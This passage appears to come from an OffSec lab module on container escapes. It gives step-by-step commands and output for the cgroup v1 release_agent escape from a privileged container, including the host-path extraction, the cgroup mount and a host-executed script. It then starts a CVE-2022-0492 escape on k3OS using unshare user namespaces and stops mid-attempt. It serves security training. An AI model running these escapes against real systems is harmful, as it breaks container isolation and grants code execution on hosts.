Essentially, the release notification feature will run a user provided script when the process exits. We can instruct the kernel to enable this feature to a specific cgroup by setting the contents of the **notify_on_release** file to _1_. The file default is to disable the notification at _0_. Once enabled, when a process is added to the cgroup, the kernel will execute the commands in the **release_agent** file, which is present in the root of the cgroup directory.

It's important to note that this exploit only works when the host is using cgroups v1 and not v2. Cgroups v2 replaced the notification mechanism and no longer executes a process when the last cgroup is populated. Instead, the **cgroup.events** file contains a variable named _populated_, which is set to "1" when the cgroup is populated with a process and "0" when the cgroup contains no process. However, just because a system's default is cgroups v2 does not mean that it can't also use cgroup v1. It's important to always check if a cgroup v1 file system can be mounted.

When a container has permissions to _write_ to the **/sys** file system or the ability to _mount_ a new cgroup file system, we can control both the **notify_on_release** and **release_agent** file. We can also add processes to a cgroup by adding the process ID(PID) to the **cgroup.procs** file also found in the cgroup folder.

We'll start by connecting to the target and gathering information. Again, we'll list the capabilities by reading **/proc/1/status** and using **capsh --decode** to decode the value.

```
victim_release_agent:~# cat /proc/1/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

victim_release_agent:~# capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

> Listing 48 - Getting Capabilities

The capabilities found in this container is a long list. This is usually an indication that the container is running with the _privileged_ flag.

Next, we'll list the mounts on the container by running **mount**.

```
victim_release_agent:~# mount
overlay on / type overlay (rw,relatime,lowerdir=/var/lib/docker/overlay2/l/KLARIHE4NADQPDWGVMHZ2RVJDE:/var/lib/docker/overlay2/l/CT5UBZSLVUJHPUNHM7BNKWQMSR:/var/lib/docker/overlay2/l/NHCEII4ZJM7C7TFQD3N4I3O4RL:/var/lib/docker/overlay2/l/UIY73XJZOTQIGEAF2EXAOU4KG7,upperdir=/var/lib/docker/overlay2/236bf7ed500f09c2cda6b5c672d085f871c7734ba01ed75ee817775df232dc88/diff,workdir=/var/lib/docker/overlay2/236bf7ed500f09c2cda6b5c672d085f871c7734ba01ed75ee817775df232dc88/work)
proc on /proc type proc (rw,nosuid,nodev,noexec,relatime)
tmpfs on /dev type tmpfs (rw,nosuid,size=65536k,mode=755,inode64)
devpts on /dev/pts type devpts (rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666)
sysfs on /sys type sysfs (rw,nosuid,nodev,noexec,relatime)
tmpfs on /sys/fs/cgroup type tmpfs (rw,nosuid,nodev,noexec,relatime,mode=755,inode64)
systemd on /sys/fs/cgroup/systemd type cgroup (rw,nosuid,nodev,noexec,relatime,xattr,name=systemd)
cgroup on /sys/fs/cgroup/hugetlb type cgroup (rw,nosuid,nodev,noexec,relatime,hugetlb)
cgroup on /sys/fs/cgroup/cpuset type cgroup (rw,nosuid,nodev,noexec,relatime,cpuset)
cgroup on /sys/fs/cgroup/cpu,cpuacct type cgroup (rw,nosuid,nodev,noexec,relatime,cpu,cpuacct)
cgroup on /sys/fs/cgroup/net_cls,net_prio type cgroup (rw,nosuid,nodev,noexec,relatime,net_cls,net_prio)
cgroup on /sys/fs/cgroup/devices type cgroup (rw,nosuid,nodev,noexec,relatime,devices)
cgroup on /sys/fs/cgroup/misc type cgroup (rw,nosuid,nodev,noexec,relatime,misc)
cgroup on /sys/fs/cgroup/blkio type cgroup (rw,nosuid,nodev,noexec,relatime,blkio)
cgroup on /sys/fs/cgroup/rdma type cgroup (rw,nosuid,nodev,noexec,relatime,rdma)
cgroup on /sys/fs/cgroup/memory type cgroup (rw,nosuid,nodev,noexec,relatime,memory)
cgroup on /sys/fs/cgroup/freezer type cgroup (rw,nosuid,nodev,noexec,relatime,freezer)
cgroup on /sys/fs/cgroup/perf_event type cgroup (rw,nosuid,nodev,noexec,relatime,perf_event)
cgroup on /sys/fs/cgroup/pids type cgroup (rw,nosuid,nodev,noexec,relatime,pids)
mqueue on /dev/mqueue type mqueue (rw,nosuid,nodev,noexec,relatime)
shm on /dev/shm type tmpfs (rw,nosuid,nodev,noexec,relatime,size=65536k,inode64)
/dev/sda1 on /etc/resolv.conf type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/sda1 on /etc/hostname type ext4 (rw,relatime,discard,errors=remount-ro)
/dev/sda1 on /etc/hosts type ext4 (rw,relatime,discard,errors=remount-ro)
```

> Listing 49 - Reviewing Container Mounts

Once again, the provided information confirms our suspicions that the current container is running in the _privileged_ context. In the output, we find that the container mounts the **/sys** file system as _read-write_.

As with most container escape exploits, we'll need to know the location of the container root file system on the host system. Fortunately, in the output of the mount command, we find the _upperdir_ variable of the root mount. This is the location of the file system on the host.

Next, we'll find a long list of cgroup mounts. A container that mounts each individual cgroup controller separately typically indicates that we're dealing with a system that uses cgroup v1 instead of v2. A cgroup v2 system would list the type as _cgroup2_ as shown below.

```
cgroup on /sys/fs/cgroup type cgroup2 (ro,nosuid,nodev,noexec,relatime,nsdelegate,memory_recursiveprot)
```

> Listing 50 - Hypothetical cgroup v2 System

In Listing 49, we also find that all the cgroup controllers are writable (as indicated by the "rw"). However, they can't all be used reliably with the release notification exploit. For example, _freezer_, _blkio_, _cpuset_, and _systemd_ don't work with the standard exploit.

However, _hugetlb_, _cpu_, _cpuacct net_cls_, _net_prio_, _devices_, _misc_, _rdma_, _memory_, _perf_event_, and _pids_ can all be used with the standard exploit. In this section, we'll use the device cgroup controller to demonstrate the exploit.

Now that we have gathered the information we need to exploit this container, let's move on to building the exploit.

We'll need to point the contents of **release_agent** to the full path of the script on the host's file system, not the container's. We'll again use **sed** and a regular expression to pull the value of **upperdir** from **/proc/mounts**.

```
victim_release_agent:~# host_path=$(sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts)

victim_release_agent:~# echo $host_path
/var/lib/docker/overlay2/236bf7ed500f09c2cda6b5c672d085f871c7734ba01ed75ee817775df232dc88/diff
```

> Listing 51 - Obtaining and Setting the Host Path

At this point, the _host_path_ variable will hold the full host path of the container's file system.

Next, we need to create a new cgroup. As mentioned earlier, we'll choose to target the _devices_ cgroup. To create a new devices cgroup, we need to create a new directory in **/sys/fs/cgroup/devices/**. We'll name this new cgroup **escapeme**.

```
victim_release_agent:~# ls -alh /sys/fs/cgroup/devices/
total 0
drwxr-xr-x    2 root     root           0 Oct 24 19:30 .
dr-xr-xr-x   15 root     root         380 Oct 24 19:30 ..
-rw-r--r--    1 root     root           0 Oct 24 19:30 cgroup.clone_children
-rw-r--r--    1 root     root           0 Oct 24 19:30 cgroup.procs
--w-------    1 root     root           0 Oct 24 19:30 devices.allow
--w-------    1 root     root           0 Oct 24 19:30 devices.deny
-r--r--r--    1 root     root           0 Oct 24 19:30 devices.list
-rw-r--r--    1 root     root           0 Oct 24 19:30 notify_on_release
-rw-r--r--    1 root     root           0 Oct 24 19:30 tasks

victim_release_agent:~# mkdir /sys/fs/cgroup/devices/escapeme
```

> Listing 52 - Creating the escapeme Cgroup

Next, we need to enable the notifications when the cgroup contains no processes. We'll do this by enabling the **notify_on_release** feature. This is done by writing a **1** to the **/sys/fs/cgroup/devices/escapeme/notify_on_release** file.

```
victim_release_agent:~# echo 1 > /sys/fs/cgroup/devices/escapeme/notify_on_release

victim_release_agent:~# cat /sys/fs/cgroup/devices/escapeme/notify_on_release
1
```

> Listing 53 - Enable notify_on_release

Now when the last process in the _escapeme_ cgroup terminates, the kernel will execute whatever command is in the **release_agent** file. The **release_agent** is in the root of the cgroup controller rather than in the specific cgroup. Since we want to execute a command we control, we'll use the _host_path_ variable we created earlier to execute a script in the root of the container. We'll call our script **cmd**.

```
victim_release_agent:~# echo $host_path/cmd >/sys/fs/cgroup/devices/release_agent
-ash: can't create /sys/fs/cgroup/devices/release_agent: Permission denied
```

> Listing 54 - Setting the release_agent - Error

Unfortunately, we receive an error. The kernel must have some additional protections that prevents us from writing to the **release_agent** file. Not all systems have this protection, but our target does. However, there are ways to circumvent this.

If we mount a new cgroup file system to a directory we control, we might be able to bypass whatever protection the system is enforcing. Let's start by deleting the cgroup we created. We can't use **rm -rf** here since **rm** will first delete the files before it deletes the directory and the files are not allowed to be deleted. Instead, we need to use **rmdir**, which will just delete the directory.

Once we've cleaned our work, we'll create a new directory in the **/tmp** directory. Next, we'll use **mount** to mount a cgroup file system to this directory. We also need to specify which cgroup controller to use with **-o**.

```
victim_release_agent:~# rmdir /sys/fs/cgroup/devices/escapeme

victim_release_agent:~# mkdir /tmp/cgrp

victim_release_agent:~# mount -t cgroup -o devices cgroup /tmp/cgrp
```

> Listing 55 - Mounting New cgroup Filesystem

Now we can create a new cgroup again and enable the notification. This time, we'll name the cgroup **x** and use the **/tmp/cgrp** directory instead of the one in the **sys** file system.

```
victim_release_agent:~# mkdir /tmp/cgrp/x

victim_release_agent:~# echo 1 > /tmp/cgrp/x/notify_on_release
```

> Listing 56 - Enabling the cgroup notification

With the notifications enabled, we can specify the command to execute in the **release_agent** file again. Once again, we'll use the **cmd** file, which we'll create later in the container root.

```
victim_release_agent:~# echo "$host_path/cmd" > /tmp/cgrp/release_agent

victim_release_agent:~# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/236bf7ed500f09c2cda6b5c672d085f871c7734ba01ed75ee817775df232dc88/diff/cmd
```

> Listing 57 - Writing the command to execute to release_agent

At this point, we've enabled the notification and set the command to be executed in the **release_agent**. We can verify that the kernel accepted this by checking **/proc/mounts** again.

```
victim_release_agent:~# cat /proc/mounts  | grep devices
cgroup /sys/fs/cgroup/devices cgroup rw,nosuid,nodev,noexec,relatime,devices,release_agent=/var/lib/docker/overlay2/236bf7ed500f09c2cda6b5c672d085f871c7734ba01ed75ee817775df232dc88/diff/cmd 0 0
cgroup /tmp/cgrp cgroup rw,relatime,devices,release_agent=/var/lib/docker/overlay2/236bf7ed500f09c2cda6b5c672d085f871c7734ba01ed75ee817775df232dc88/diff/cmd 0 0
victim_release_agent:~#
```

> Listing 58 - Verifying release_agent

Even though we weren't able to write to the **release_agent** file in the **sys** file system, we were able to still change the **release_agent** configuration. This confirms that the kernel was able to read the configuration. and accept the modification.

Next, we need to create the **cmd** script that will be executed by the host. We'll start with the standard shebang then run the **ps aux** command, but redirect the _stdout_ to a file named **output** in the containers root directory. Remember, to reference the containers root directory, we need to use the **$host_path** variable. Finally, we'll use the **chmod** binary to make the script executable.

```
victim_release_agent:~# echo '#!/bin/sh' > /cmd

victim_release_agent:~# echo "ps aux > $host_path/output" >> /cmd

victim_release_agent:~# chmod a+x /cmd
```

> Listing 59 - Creating Executable Script

At this point, the setup is complete. The only remaining part is to start a process in our custom cgroup. Once the process completes, our script should be executed. For now, we'll run **sleep 30** in the background (by specifying **&** at the end of the command). Once executed, we'll move the sleep process into the cgroup. We can get the process ID of the previous command by using the **$!** variable. We'll add the **sleep** command to the cgroup by adding it to the **/tmp/cgrp/x/cgroup.procs** file.

After 30 seconds, our script should have executed, and we can check the **/output** file for the output of the **ps aux** command.

```
victim_release_agent:~# sleep 30 &

victim_release_agent:~# echo $! > /tmp/cgrp/x/cgroup.procs
victim_release_agent:~#
[1]+  Done                       sleep 30

victim_release_agent:~# head /output
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 166860 11068 ?        Ss   12:40   0:01 /sbin/init
root           2  0.0  0.0      0     0 ?        S    12:40   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   12:40   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   12:40   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   12:40   0:00 [netns]
root           7  0.0  0.0      0     0 ?        I<   12:40   0:00 [kworker/0:0H-events_highpri]
root           9  0.0  0.0      0     0 ?        I<   12:40   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    12:40   0:00 [rcu_tasks_rude_]
root          11  0.0  0.0      0     0 ?        S    12:40   0:00 [rcu_tasks_trace]
```

> Listing 60 - Starting a Process and Moving it to our Cgroup

Excellent! We were able to execute a command on the host.

It's easy to become impatient if we have to wait 30 seconds for each command to terminate to get the output. Let's improve this part of the exploit.

We can start a process that will echo its PID to the appropriate file and immediately exit. We can **echo** the PID of the current process with the **$$** variable. Furthermore, we also need to wrap the entire echo command in a **sh** command.

Before we run this, we'll remove the current **output** file.

```
victim_release_agent:~# rm /output

victim_release_agent:~# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"

victim_release_agent:~# head /output
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.2 166860 11068 ?        Ss   12:40   0:01 /sbin/init
root           2  0.0  0.0      0     0 ?        S    12:40   0:00 [kthreadd]
root           3  0.0  0.0      0     0 ?        I<   12:40   0:00 [rcu_gp]
root           4  0.0  0.0      0     0 ?        I<   12:40   0:00 [rcu_par_gp]
root           5  0.0  0.0      0     0 ?        I<   12:40   0:00 [netns]
root           7  0.0  0.0      0     0 ?        I<   12:40   0:00 [kworker/0:0H-events_highpri]
root           9  0.0  0.0      0     0 ?        I<   12:40   0:00 [mm_percpu_wq]
root          10  0.0  0.0      0     0 ?        S    12:40   0:00 [rcu_tasks_rude_]
root          11  0.0  0.0      0     0 ?        S    12:40   0:00 [rcu_tasks_trace]
```

> Listing 61 - Faster execution of exploit

At this point we have immediate execution of our script and can escape the container.

This cgroup exploit is a well known exploit for escaping a privileged container. However, while cgroup v1 is still in use now, it will be phased out over time. There are also other exploits we can use to escape a container.

## Resources

Some of the labs require you to start the target machine(s) below.

Please note that the IP addresses assigned to your target machines may not match those referenced in the Module text and video.

Containers - release_agent - Exercise

Containers - uevent_helper - Exercise

#### Labs

What is the name of the file that holds the script to be executed?

Answer

What file enables release notifications?

Answer

True or False: The release notifications exploit works with cgroups v1 and v2.

Answer

Use the "Containers - release_agent - Exercise" vm and connect to the victim via ssh on port 2222 with the username root and the password root. Exploit the core_pattern exploit to escape out of the container. Once executing commands on the host, find the flag in **/root/proof.txt**.

Answer

Use the "Containers - uevent_helper - Exercise" vm and connect to the victim via ssh on port 2222 with the username root and the password root. Research and exploit the uevent_helper kernel feature to escape a privileged container. Once executing commands on the host, find the flag in **/root/proof.txt**.

Answer

## 7.2.9. Accessing the Labs - Escaping with a Kernel Exploit

In this next section, we'll use a single target to learn about escaping a default, non-privileged container by exploiting a kernel vulnerability.

We'll start the virtual machine for this section below. We will connect to our shell via SSH on port 32222. We can start the lab below and obtain the IP and password by clicking the information icon. From this shell, we will conduct our attack. It's important to note that the victim container contains several non-standard binaries (such as nmap). We've provided these to simplify access. In the real world, these would have to be transferred or installed.

Let's start the "aws/container-escapes-k3os" host and continue with the Learning Module.

## 7.2.10. Escaping with a Kernel Exploit

In this section, we will be exploiting _CVE-2022-0492_ to escape out of a container. So far, we have been exploiting configurations that weaken the security posture of containers. In this section, we will be exploiting the kernel from a default container. Because containers share the kernel with the host, we can escape out of a container if we can use an exploit to have the kernel run code.

We'll start by analyzing the vulnerability in Linux. Once we understand the vulnerability, we'll discuss the default security configurations that prevent this vulnerability in many situations. As we'll find, containerization-specific distributions may disable many security features in favor of lower resource utilization.

CVE-2022-0492 was discovered by Yiqi Sun and Kevin Wang. The description of the vulnerability states:

A vulnerability was found in the Linux kernel’s cgroup_release_agent_write in the kernel/cgroup/cgroup-v1.c function. This flaw, under certain circumstances, allows the use of the cgroups v1 release_agent feature to escalate privileges and bypass the namespace isolation unexpectedly.

While Yiqi Sun and Kevin Wang discovered the vulnerability in the Linux Kernel, Dejan Zelic at OffSec discovered that it can be exploited in non-privileged containers in the _k3OS_ operating system.

Let's inspect the _commit_[1](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1106-1) that fixed this issue in the kernel to understand it better. The fix impacted two functions in the **cgroup-v1.c** file. The first being the _cgrouprelease_agent_write__ function and the other being the _cgroup1_parse_param_ function. Both changes are nearly identical so let's just investigate _cgrouprelease_agent_write_.

```
545  static ssize_t cgroup_release_agent_write(struct kernfs_open_file *of,
546                                            char *buf, size_t nbytes, loff_t off)
547  {
548          struct cgroup *cgrp;
549
550          BUILD_BUG_ON(sizeof(cgrp->root->release_agent_path) < PATH_MAX);
551
552          /*
553           * Release agent gets called with all capabilities,
554           * require capabilities to set release agent.
555           */
556          if ((of->file->f_cred->user_ns != &init_user_ns) ||
557              !capable(CAP_SYS_ADMIN))
558                  return -EPERM;
559
560          cgrp = cgroup_kn_lock_live(of->kn, false);
561          if (!cgrp)
562                  return -ENODEV;
563          spin_lock(&release_agent_path_lock);
564          strlcpy(cgrp->root->release_agent_path, strstrip(buf),
565                  sizeof(cgrp->root->release_agent_path));
566          spin_unlock(&release_agent_path_lock);
567          cgroup_kn_unlock(of->kn);
568          return nbytes;
569  }
```

> Listing 62 - cgroup_release_agent_write Function in Linux

As shown in Listing 62, the added sections are highlighted. On lines 552-555, a comment summarizes the change and lines 556-558 are the actual code changes. Essentially, this change checks if the process making the change to the **release_agent** file is in the initial (_root_) user namespace or if the process has the CAP_SYS_ADMIN capability. If not, a permission error will be returned.

The check for the capability is obvious, if the process doesn't contain the appropriate capability, block it. However, the namespace check is less obvious. This section is actually a hint to how we'll exploit our target. As we'll find, by creating a new user namespace, we can obtain the CAP_SYS_ADMIN capability even if the process did not originally possess it.

Prior to this fix, Linux never verified that the process making changes to the **release_agent** file was allowed to do so. Recalling the previous section, manipulation of the **release_agent** file allows for a container escape. This sounds like a very impactful vulnerability, however, there's a large caveat that prevents it from being exploited in most containers.

Most container engines mount the **/sys** file system as _read-only_. We can bypass this by mounting our own cgroup controller; however, by default, Docker and Podman have a _seccomp policy_ that blocks the "mount" syscall. In addition, _AppArmor_ and _SELinux_, which is enabled by default on most systems, would prevent the mounting of cgroups as read-write.

This is a great example of when defense-in-depth prevents a bad vulnerability from being disastrous!

However, Kubernetes, by default, has the seccomp policy disabled. Active development on a default seccomp profile is being worked on but that feature is not currently stable. In addition, some Linux distributions removed AppArmor and SELinux from the system in an effort to minimize resources. An example of this is k3OS.[2](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1106-2) Described as the "Kubernetes Operating System", it was designed as "to simplify Kubernetes operations in low-resource computing environments." k3OS was developed and released by _Rancher_, an organization acquired by _SUSE_.

k3OS runs the K3s Kubernetes distribution and at one point, k3OS did have AppArmor enabled. However, K3s added the use of _apparmor_parser_ to parse AppArmor profiles. Being that k3OS aims to be lightweight, it lacked[3](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1106-3) the apparmor_parser tool and a _package manager_ to install one. This prevented any pod from being started. To fix this, k3OS disabled AppArmor completely,[4](https://portal.offsec.com/learning-paths/offensive-cloud-foundations-167536/learning/container-escapes-interacting-with-the-host-51510/executing-commands-51564/labs-51511#fn-local_id_1106-4) preventing K3s from ever needing to run apparmor_parser.

The latest version, at the time of this writing, of k3OS runs _5.4.0-37_, but the CVE was fixed in _Linux 5.4.0-105_. When OffSec contacted Rancher about this, they indicated that k3OS is no longer maintained.

This means that we can run the **mount** command since seccomp is disabled and we can mount _cgroupfs_ as read-write since AppArmor is disabled.

Let's connect to our victim shell and start gathering information.

```
kali@kali:~$ ssh -p 32222 root@k3os
root@k3os's password:
..
root@victim-k3os:~#
```

> Listing 63 - Connecting to Shell via SSH

Let's gather information about the _runtime_, _mounts_, and _capabilities_. We can find the container _runtime_ and the _mounts_ by inspecting **/proc/mounts**.

```
root@victim-k3os:~# cat /proc/mounts
overlay / overlay rw,relatime,lowerdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/76/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/75/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/74/fs:/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/72/fs,upperdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/79/fs,workdir=/var/lib/rancher/k3s/agent/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/79/work,xino=off 0 0
proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0
tmpfs /dev tmpfs rw,nosuid,size=65536k,mode=755 0 0
devpts /dev/pts devpts rw,nosuid,noexec,relatime,gid=5,mode=620,ptmxmode=666 0 0
mqueue /dev/mqueue mqueue rw,nosuid,nodev,noexec,relatime 0 0
sysfs /sys sysfs ro,nosuid,nodev,noexec,relatime 0 0
tmpfs /sys/fs/cgroup tmpfs rw,nosuid,nodev,noexec,relatime,mode=755 0 0
cpuset /sys/fs/cgroup/cpuset cgroup ro,nosuid,nodev,noexec,relatime,cpuset 0 0
cpu /sys/fs/cgroup/cpu cgroup ro,nosuid,nodev,noexec,relatime,cpu 0 0
cpuacct /sys/fs/cgroup/cpuacct cgroup ro,nosuid,nodev,noexec,relatime,cpuacct 0 0
blkio /sys/fs/cgroup/blkio cgroup ro,nosuid,nodev,noexec,relatime,blkio 0 0
memory /sys/fs/cgroup/memory cgroup ro,nosuid,nodev,noexec,relatime,memory 0 0
devices /sys/fs/cgroup/devices cgroup ro,nosuid,nodev,noexec,relatime,devices 0 0
freezer /sys/fs/cgroup/freezer cgroup ro,nosuid,nodev,noexec,relatime,freezer 0 0
net_cls /sys/fs/cgroup/net_cls cgroup ro,nosuid,nodev,noexec,relatime,net_cls 0 0
perf_event /sys/fs/cgroup/perf_event cgroup ro,nosuid,nodev,noexec,relatime,perf_event 0 0
net_prio /sys/fs/cgroup/net_prio cgroup ro,nosuid,nodev,noexec,relatime,net_prio 0 0
hugetlb /sys/fs/cgroup/hugetlb cgroup ro,nosuid,nodev,noexec,relatime,hugetlb 0 0
pids /sys/fs/cgroup/pids cgroup ro,nosuid,nodev,noexec,relatime,pids 0 0
...
```

> Listing 64 - Listing mounts

In the list of mounts, we can find the location of the container file system on the host. We'll make note of this for later. We'll also find that the container mounts all cgroup file systems as _read-only_. This indicates that we are not running in a privileged context.

Next, let's check the _capabilities_ by searching for the "Cap" string in **/proc/1/status**. We'll decode the value with **capsh --decode**.

```
root@victim-k3os:~# cat /proc/1/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

root@victim-k3os:~# capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

> Listing 65 - Obtaining Capabilites of Current Container

The container has the default set of _capabilities_. Notably, we are missing CAP_SYS_ADMIN, which could allow us to edit the **release_agent** file.

Next, let's gather information about the kernel version. We'll use the **uname** command with the **--kernel-release** argument.

```
root@victim-k3os:~# uname --kernel-release
5.4.0-37-generic
```

> Listing 66 - Obtaining Kernel Version

As mentioned earlier, Linux 5.4.0-105 is where the fix for CVE-2022-0492 was implemented. This means that the target is vulnerable to the exploit.

While we found that the container mounts cgroup file systems as read-only, let's try to create a new cgroup anyway. This will help us understand the error messages we get at various stages of the exploit. We'll use the devices cgroup controller and call our new cgroup **x**. We'll attempt to create the cgroup by creating a directory in **/sys/fs/cgroup/devices/**.

```
root@victim-k3os:~# mkdir /sys/fs/cgroup/devices/x
mkdir: cannot create directory ‘/sys/fs/cgroup/devices/x’: Read-only file system
```

> Listing 67 - Atempting to Add New Cgroup

As expected, we received an error. The error specified that the system was read-only. Next, let's try to mount a cgroup file system to a directory that we control.

```
root@victim-k3os:~# mkdir /tmp/cgroupfs

root@victim-k3os:~# mount -t cgroup -o devices cgroup /tmp/cgroupfs
mount: /tmp/cgroupfs: permission denied.
```

> Listing 68 - Attempting to Mount a Cgroup Filesystem

This time, we get a generic "permission denied" error. If this was a system that had a seccomp policy (Docker or Podman), the permission denied would have been blocked because the _mount syscall_ is not allowed. However, since Kubernetes, by default, doesn't use seccomp and lacks the CAP_SYS_ADMIN capability, Linux generated this error. We were able to do this when we were running in a privileged container because we had CAP_SYS_ADMIN.

We do have a workaround for this issue though and it is to create a new _user_ namespace. The documentation for the _user_ namespace states:

User namespaces isolate security-related identifiers and attributes, in particular, user IDs and group IDs (see credentials(7)), the root directory, keys (see keyrings(7)), and capabilities (see capabilities(7)).

Because a user namespace isolates capabilities, if we can create a new user namespace, we can obtain full capabilities. The capabilities will be limited to that user namespace. However, this doesn't matter to us since the execution of the **release_agent** is done by the kernel. This means that the execution won't be namespaced.

To start a new process in a new user namespace, we can use **unshare**. The unshare command creates new namespaces specified by a command-line option and then executes the specified program in that namespace. Again, with systems that use seccomp, the unshare syscall would be blocked. However, we are not limited by seccomp. We'll use the **--user** argument to specify that we want a new user namespace and then execute bash to get a shell in the new namespace.

We'll also change the _PS1_ environmental variable, which will change the shell prompt. This isn't necessary but it's a good idea to mark whether we're in a namespaced shell or not. Instead of the hostname (victim-k3os), we'll have the prompt say "unshare" instead.

```
root@victim-k3os:~# unshare --user bash

nobody@victim-k3os:~$ PS1="\\u@unshare:\\w\\$ "

nobody@unshare:~$
```

> Listing 69 - Starting new User Namespace

Next, let's check the capabilities for the current process. We'll use the **/proc** file system to check the capabilities. Since we care about the unshare process, we'll use **self** to reference the current processes PID. Finally, we'll use **capsh --decode** to parse the value.

```
nobody@unshare:~$ cat /proc/self/status | grep Cap
CapInh: 0000000000000000
CapPrm: 0000000000000000
CapEff: 0000000000000000
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000

nobody@unshare:~$ capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
```

> Listing 70 - Checking Capabilities of Namespaced Process

As described in the documentation, the user namespace isolates capabilities. This provides us with the necessary CAP_SYS_ADMIN capability.

Next, let's try to **mount** the cgroupfs again.

```
nobody@unshare:~$ mount -t cgroup -o rdma cgroup /tmp/cgroupfs
mount: only root can use "--options" option

nobody@unshare:~$ whoami
nobody
```

> Listing 71 - Attempting to Mount Cgroupfs with CAP_SYS_ADMIN

Unfortunately, we receive an error that we need to be _root_ to run **mount** with the "options" argument. Our current user is "nobody", which means it's not mapped to a valid user. This can be solved by mapping the container's _root_ user to the new user namespace. The **unshare** binary contains a **--map-root-user** argument that does exactly this. Let's exit our current shell and restart with that argument.

Once we obtain the new shell, we'll again change the _PS1_ variable and try to **mount** the file system again.

```
root@unshare:~# exit
exit

root@victim-k3os:~# unshare --user --map-root-user bash

root@victim-k3os:~# PS1="\\u@unshare:\\w\\$ "
root@unshare:~#

root@unshare:~# mount -t cgroup -o rdma cgroup /tmp/cgroupfs
mount: /tmp/cgroupfs: permission denied.
```

> Listing 72 - Attempting to Mount with Mapped Root User

Unfortunately, we get a "permission denied" error again. At this point we could either be blocked by seccomp (which would have also blocked unshare, so we can rule that out), we could be blocked because we can't mount anything new in the current mount namespace, or some other security mechanism might be blocking us from mounting a cgroup file system specifically. We can rule out the last option by trying to mount a **tmpfs** file system. We'll create a new folder in **/tmp** and use the **mount** binary to mount a **tmpfs** file system type to that newly created directory.

```
root@unshare:~# mkdir /tmp/test-mount

root@unshare:~# mount -t tmpfs tmpfs /tmp/test-mount/
mount: /tmp/test: permission denied.
```

> Listing 73 - Mounting a tmp File System

Once again, we receive an error, which means that we're not blocked because it's a cgroupfs.

If we create a new mount namespace, we should have full permissions to mount again. If this works, we'll be closer to exploiting the system. We'll exit our current "unshare" shell and start a new one with the **--mount** argument for a new mount namespace.

```
root@unshare:~# exit
exit

root@victim-k3os:~# unshare --user --map-root-user --mount bash

root@victim-k3os:~# PS1="\\u@unshare:\\w\\$ "

root@unshare:~# mount -t tmpfs tmpfs /tmp/test-mount/
root@unshare:~#
```

> Listing 74 - Mounting tmp Filesystem

This time, we didn't receive an error. At this point, we know that we can run the mount and unshare syscalls meaning there's no seccomp policy. We also know that we can indeed mount a file system. Now, let's try to **mount** the cgroup file system again.

```
root@unshare:~# mount -t cgroup -o rdma cgroup /tmp/cgroupfs
mount: /tmp/cgroupfs: permission denied.
```

> Listing 75 - Attempting to Mount Cgroup Filesystem

This is frustrating! We were blocked again!

We have one more thing to try. This block might be because the new namespace can't mount the existing cgroup namespace. If we create a new cgroup namespace, will we be able to mount it?

